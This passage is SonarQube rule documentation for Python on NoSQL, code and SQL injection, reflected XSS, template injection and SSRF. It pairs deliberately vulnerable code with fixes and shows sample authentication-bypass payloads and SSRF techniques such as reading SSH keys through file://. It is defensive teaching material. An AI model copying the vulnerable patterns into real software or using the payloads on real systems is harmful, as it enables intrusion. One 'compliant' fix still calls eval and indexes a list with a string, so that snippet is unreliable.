used to break out of a command call.</p>
<p>Therefore, it is generally preferable to disable shell integration.</p>
<p>In the example compliant code, using the <code>subprocess</code> module’s functions is preferred over older alternative as the <code>os</code> or
<code>popen</code> modules. Indeed, <code>subprocess</code>, while still a dangerous library, disables the system shell’s syntax interpretation by
default.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" rel="nofollow">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li><li> <a href="https://gtfobins.github.io/#&#43;shell" rel="nofollow">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://lolbas-project.github.io/#" rel="nofollow">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://peps.python.org/pep-0324/" rel="nofollow">PEP 324 – subprocess - New process module</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/78" rel="nofollow">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5147">
              pythonsecurity:S5147
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to NoSQL injection:<br /> After discovering the injection point, attackers insert data into
the vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data leakage</h4>
<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more
databases.<br /> This threat is the most widespread impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br /> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>
<h4>Chaining NoSQL injections with other vulnerabilities</h4>
<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br /> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul><li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li><li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li></ul>
<h2>How to fix it in Amazon DynamoDB</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to NoSQL injection because untrusted data is concatenated to the <code>FilterExpression</code> value. This
expression determines which items within the results should be returned.</p>
<p>A malicious HTTP request containing the following query parameter values <code>username&#61;admin&amp;password&#61;size(password) or
size(password)&#61;size(password)</code> would allow an attacker to manipulate the returned data and bypass authentication.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
&#64;app.route(&#39;/login&#39;)
def login():
    dynamodb &#61; AWS_SESSION.client(&#39;dynamodb&#39;)

    username &#61; request.args[&#34;username&#34;]
    password &#61; request.args[&#34;password&#34;]

    dynamodb.scan(
        FilterExpression&#61; &#34;username &#61; &#34; &#43; username &#43; &#34; and password &#61; &#34; &#43; password, # Noncompliant
        TableName&#61;&#34;users&#34;,
        ProjectionExpression&#61;&#34;username&#34;
    )
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
&#64;app.route(&#39;/login&#39;)
def login():
    dynamodb &#61; AWS_SESSION.client(&#39;dynamodb&#39;)

    username &#61; request.args[&#34;username&#34;]
    password &#61; request.args[&#34;password&#34;]

    dynamodb.query(
        KeyConditionExpression&#61; &#34;username &#61; :u&#34;,
        FilterExpression&#61; &#34;password &#61; :p&#34;,
        ExpressionAttributeValues&#61;{
            &#34;:u&#34;: { &#39;S&#39;: username },
            &#34;:p&#34;: { &#39;S&#39;: password }
        },
        TableName&#61;&#34;users&#34;,
        ProjectionExpression&#61;&#34;username&#34;
    )
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the approach to protect against injection vulnerabilities is to ensure that untrusted data cannot break out of the initially
intended logic.</p>
<p>When using DynamoDB with Boto3, the best way to do so is by using expression attributes as placeholders (<code>:placeholder</code>). It will end up
replacing the attribute with the value defined in <code>ExpressionAttributeValues</code> and prevent any alteration of the original query logic. The
compliant code example uses such an approach.</p>
<p>When possible, use the method <code>query</code> over <code>scan</code> as it disallows the <code>OR</code> operator on the
<code>KeyConditionExpression</code> attribute and therefore reduces the attack surface. It also optimizes speed and costs.</p>
<p>This logic applies both when using the <code>DynamoDB.Client</code> and the <code>DynamoDB.Table</code> class, though the syntax differs for the
latter, and the <code>ExpressionAttributeValues</code> would look like the following:</p>
<pre>
ExpressionAttributeValues&#61;{
    &#34;:u&#34;: username,
    &#34;:p&#34;: password
}
</pre>
<p>Although injection can occur on all the query or scan <code>Expression</code> attributes, its most severe impact occurs in the
<code>FilterExpression</code>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/nosql-injections-in-rocket-chat/" rel="nofollow">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/943" rel="nofollow">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5334">
              pythonsecurity:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br /> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it runs dynamic Python code based on untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request

&#64;app.route(&#34;/&#34;)
def example():
    operation &#61; request.args.get(&#34;operation&#34;)
    eval(f&#34;product_{operation}()&#34;) # Noncompliant
    return &#34;OK&#34;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request

&#64;app.route(&#34;/&#34;)
def example():
    allowed &#61; [&#34;add&#34;, &#34;remove&#34;, &#34;update&#34;]
    operation &#61; allowed[request.args.get(&#34;operationId&#34;)]
    eval(f&#34;product_{operation}()&#34;)

    return &#34;OK&#34;
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br /> Therefore, our suggestion
is to avoid executing code dynamically.<br /> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<p>The example compliant code uses such a binding approach.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/" rel="nofollow">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S3649">
              pythonsecurity:S3649
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br /> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br /> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br /> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul><li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li><li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul><li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">our article on this topic</a> </li></ul>  </li></ul>
<h2>How to fix it in SQLAlchemy</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple data retrieval function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
&#39; OR &#39;1&#39;&#61;&#39;1
</pre>
<p>Using the UNION clause, an attacker would also be able to perform queries against other tables and combine the returned data within the same query
result.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request
import sqlalchemy

&#64;app.route(&#39;/example&#39;)
def get_users():
    user &#61; request.args[&#34;user&#34;]
    conn &#61; sqlalchemy.create_engine(connection_string)
    conn &#61; engine.connect()

    conn.execute(&#34;SELECT user FROM users WHERE user &#61; &#39;&#34; &#43; user &#43; &#34;&#39;&#34;) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request
import sqlalchemy

&#64;app.route(&#39;/example&#39;)
def get_users():
    user &#61; request.args[&#34;user&#34;]
    conn &#61; sqlalchemy.create_engine(connection_string)
    metadata &#61; sqlalchemy.MetaData(bind&#61;conn, reflect&#61;True)
    users &#61; metadata.tables[&#39;users&#39;]
    conn &#61; engine.connect()

    sql &#61; users.select().where(users.c.user &#61;&#61; user)
    conn.execute(sql)
</pre>
<h3>How does this work?</h3>
<h4>Use secure APIs</h4>
<p>Some frameworks provide a database abstraction layer that frees the developers from sanitizing or writing prepared statements.</p>
<p>These provided APIs can be described as &#34;secure by design&#34;.<br /> By providing a builder pattern with parameter binding behind the scenes,
<code>SQLAlchemy</code> can be called &#34;secure by design&#34; as it adds multiple layers of security to the code while keeping the codebase shorter.</p>
<p><strong>Note</strong>: These types of APIs can also provide &#34;raw&#34; functions or equivalents. These functions allow developers to create complex
queries using the user-friendly builder pattern.<br /> These methods should be considered unsafe and should not be used with untrusted data. For
example, <code>SQLAlchemy</code> exposes <code>sqlalchemy.text()</code> that is prone to injections.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">SonarSource, Exploiting Hibernate Injections</a> </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS, Top 25 Software Errors</a> - Insecure Interaction Between Components </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ" rel="nofollow">CERT, IDS00-J.</a> - Prevent SQL injection </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5131">
              pythonsecurity:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br /> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in Django</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains user input.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response. For
example, you can use the <code>JsonResponse</code> class to return JSON messages securely.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from django.http import HttpResponse
import json

def index(request):
    json &#61; json.dumps({ &#34;data&#34;: request.GET.get(&#34;input&#34;) })
    return HttpResponse(json)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from django.http import JsonResponse

def index(request):
    json &#61; { &#34;data&#34;: request.GET.get(&#34;input&#34;) }
    return JsonResponse(json)
</pre>
<p>It is also possible to set the content-type manually with the <code>content_type</code> parameter when creating an <code>HttpResponse</code>
object.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="2" data-diff-type="noncompliant">
from django.http import HttpResponse

def index(request):
    return HttpResponse(request.GET.get(&#34;input&#34;))
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="2" data-diff-type="compliant">
from django.http import HttpResponse

def index(request):
    return HttpResponse(request.GET.get(&#34;input&#34;), content_type&#61;&#34;text/plain&#34;)
</pre>
<h3>How does this work?</h3>
<p>If the HTTP response consists of HTML code, it is highly recommended to use a template engine like <a href="https://docs.djangoproject.com/en/4.0/topics/templates/" rel="nofollow">Django’s template system</a> to generate it. The Django template engine separates the
view from the business logic and automatically encodes the output of variables, drastically reducing the risk of cross-site scripting
vulnerabilities.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by telling them what data they are receiving with the
<code>content-type</code> HTTP header. This header tells the browser that the response does not contain HTML code and should not be parsed and
interpreted as HTML. Thus, the response is not vulnerable to reflected cross-site scripting.</p>
<p>For example, setting the Content-Type HTTP header to <code>text/plain</code> allows to safely reflect user input, because browsers will not try to
parse and execute the response.</p>
<h3>Pitfalls</h3>
<h4>Content-types</h4>
<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to
cross-site scripting vulnerabilities.<br /> The following content-types are known to be affected:</p>
<ul><li> application/mathml&#43;xml </li><li> application/rdf&#43;xml </li><li> application/vnd.wap.xhtml&#43;xml </li><li> application/xhtml&#43;xml </li><li> application/xml </li><li> image/svg&#43;xml </li><li> multipart/x-mixed-replace </li><li> text/html </li><li> text/rdf </li><li> text/xml </li><li> text/xsl </li></ul>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is
sometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the
filters.</p>
<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is
trying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,
in the long run, is very difficult.</p>
<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of &#34;javascript:&#34; URI.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br /> <a href="https://web.dev/csp-xss/" rel="nofollow">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li><li> <a href="https://docs.djangoproject.com/en/4.0/ref/request-response/" rel="nofollow">Django Project, Request and response objects (Django 4.0)</a> </li><li> <a href="https://docs.djangoproject.com/en/4.0/ref/templates/builtins" rel="nofollow">Django, Built-in template tags and filters</a> </li><li> <a href="https://flask.palletsprojects.com/en/2.1.x/security/?highlight&#61;xss#cross-site-scripting-xss" rel="nofollow">Flask, Security Considerations</a> </li><li> <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/" rel="nofollow">The Pallets Projects, Jinja, Template Designer Documentation</a> </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability" rel="nofollow">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li><li> <a href="https://blog.sonarsource.com/ghost-admin-takeover" rel="nofollow">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li><li> <a href="https://samy.pl/myspace/" rel="nofollow">Samy Kamkar, The MySpace Worm</a> </li></ul>
<h3>Conference presentations</h3>
<ul><li> <a href="https://www.youtube.com/watch?v&#61;ksq7e6UUDag" rel="nofollow">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79.html" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5496">
              pythonsecurity:S5496
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-side template injections occur in an application when the application retrieves data from a user or a third-party service and inserts it
into a template, without sanitizing it first.</p>
<p>If an application contains a template that is vulnerable to injections, it is exposed to attacks that target the underlying rendering server.</p>
<p>A user with malicious intent can create requests that will cause the template to change its logic into unwanted behavior.</p>
<p>After creating the malicious request, the attacker can attack the servers affected by this vulnerability without relying on any prerequisites.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a server-side template injection vulnerability will be able to execute arbitrary commands on the underlying operating
system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>The following code is vulnerable to server-side template injection because it is inserting untrusted inputs into a string that is then processed
for rendering.<br /> This vulnerability arises because the rendering function does not validate the input, allowing attackers to potentially inject
malicious Python code for execution.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request, render_template_string

&#64;app.route(&#39;/example&#39;)
def example():
    username &#61; request.args.get(&#39;username&#39;)
    template &#61; f&#34;&lt;p&gt;Hello {username}&lt;/p&gt;&#34;
    return render_template_string(template) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request, render_template_string

&#64;app.route(&#39;/example&#39;)
def example():
    username &#61; request.args.get(&#39;username&#39;)
    template &#61; &#34;&lt;p&gt;Hello {<!-- -->{ username }}&lt;/p&gt;&#34;
    return render_template_string(template, username&#61;username)
</pre>
<h3>How does this work?</h3>
<h4>Use template variables</h4>
<p>The universal method to prevent path injection is to sanitize untrusted data. Manual sanitization is error-prone, so it is best to automate the
process.</p>
<p>Here, <code>render_template_string</code> automatically sanitizes template variables by escaping them. This means that any untrusted data will not
be able to break out of the initially intended template logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://medium.com/&#64;nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee" rel="nofollow">SSTI in Flask/Jinja2</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/94" rel="nofollow">MITRE, CWE-94</a> - Improper Control of Generation of Code </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5144">
              pythonsecurity:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br /></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br /> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br /> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br /> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request
from urllib.request import urlopen

&#64;app.route(&#39;/example&#39;)
def example():
    url &#61; request.args[&#34;url&#34;]
    urlopen(url).read() # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request
from urllib.parse import urlparse
from urllib.request import urlopen

SCHEMES_ALLOWLIST &#61; [&#39;https&#39;]
DOMAINS_ALLOWLIST &#61; [&#39;trusted1.example.com&#39;, &#39;trusted2.example.com&#39;]

&#64;app.route(&#39;/example&#39;)
def example():
    url &#61; request.args[&#34;url&#34;]
    if urlparse(url).hostname in DOMAINS_ALLOWLIST and urlparse(url).scheme in SCHEMES_ALLOWLIST:
        urlopen(url).read()
</pre>
<h3>How does this work?</h3>
<p>The application should avoid opening URLs that are constructed with untrusted data.</p>
<p>When such a feature is strictly necessary, SSRF can be mitigated by applying an allow-list of trustable schemes and domains.</p>
<p>The compliant code example uses such an approach.</p>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
